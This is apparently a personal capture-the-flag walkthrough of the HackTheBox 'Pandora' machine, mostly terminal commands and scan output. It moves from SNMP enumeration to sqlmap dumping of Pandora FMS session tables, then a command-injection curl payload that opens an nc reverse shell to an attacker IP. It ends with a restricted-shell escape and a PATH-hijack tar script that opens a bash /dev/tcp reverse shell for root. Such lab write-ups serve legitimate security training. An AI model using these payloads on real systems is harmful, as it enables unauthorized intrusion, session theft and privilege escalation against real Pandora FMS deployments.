
```
ares@legion:~/HackTheBox$ sudo nmap -sVC -sU -A -T4 $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 12:17 EET
Nmap scan report for 10.129.58.133 (10.129.58.133)
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 1h06m58s
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.129.58.133:22     10.10.14.53:35372
|   TCP  10.129.58.133:53634  1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:68           *:*
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-processes: 

| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 482.71 Kb sent, 482.71 Kb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.129.58.133  Netmask: 255.255.0.0
|     MAC address: 00:50:56:94:f1:e7 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 65.93 Mb sent, 24.70 Mb received
| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
|_  System uptime: 1h06m58.39s (401839 timeticks)
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown
Service Info: Host: pandora


TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   46.66 ms 10.10.14.1 (10.10.14.1)
2   46.71 ms 10.129.58.133 (10.129.58.133)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
```


```
snmpwalk -v 1 -c public $target
```
![[Pasted image 20251113124057.png]]

After a few minutes we get:
![[Pasted image 20251113124750.png]]

```
cat /etc/apache2/sites-enabled/pandora.conf
```
![[Pasted image 20251113131219.png]]

Tunneling Web to our localhost: 
```
ssh daniel@10.129.58.133 -L 80:127.0.0.1:80
```

Version at the bottom:
![[Pasted image 20251113132929.png]]

Top Results for version:
https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/
https://github.com/UNICORDev/exploit-CVE-2020-5844.git

sqlmap against the SQLi vulnerable endpoint /include/chart_gernerator.php .
```
sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" --current-db
```

Obtaining the list of tables in the database
```
sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
```

Dumping the tsessions_php table in order to obtain a usable session_id value in order to login into the Pandora FMS by impersonating an elevated user, i.e. matt .
```
sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -Ttsessions_php --dump
```
![[Pasted image 20251113134631.png]]

URL in browser: 
```
http://localhost/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
```

Forward from burp: 
![[Pasted image 20251113135342.png]]

Vulnerable to:
https://github.com/hadrian3689/pandorafms_7.44

```
curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "http://localhost/pandora_console/ajax.php?page=include/ajax/events&perform_event_response=10000000&target=mkfifo%20/tmp/f%3B%20nc%2010.10.14.53%204444%200%3C/tmp/f%7C/bin/sh%20-%202%3E%261%7Ctee%20/tmp/f&response_id=1"
```
or
```
URL="http://localhost/pandora_console/ajax.php"
PARAMS="page=include/ajax/events&perform_event_response=10000000&target=mkfifo%20/tmp/f%3B%20nc%2010.10.14.53%204444%200%3C/tmp/f%7C/bin/sh%20-%202%3E%261%7Ctee%20/tmp/f&response_id=1"

curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "${URL}?${PARAMS}"
```
![[Pasted image 20251113141029.png]]

Privesc:
```
find / -type f -perm -04000 -ls 2>/dev/null
file /usr/bin/pandora_backup
/usr/bin/pandora_backup --help
ltrace /usr/bin/pandora_backup 2>&1
```
![[Pasted image 20251113143249.png]]

Breaking out from the restricted shell environment
https://gtfobins.github.io/gtfobins/at/#shell
```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Execute again: 
/usr/bin/pandora_backup
```
![[Pasted image 20251113144057.png]]

PATH variable hijacking tar:
```
echo '#!/bin/bash' > /tmp/tar
echo 'bash -i >& /dev/tcp/10.10.14.53/4444 0>&1' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH

# Attacker
nc -nvlp 4444

# Remote 
/usr/bin/pandora_backup
```
![[Pasted image 20251113154458.png]]

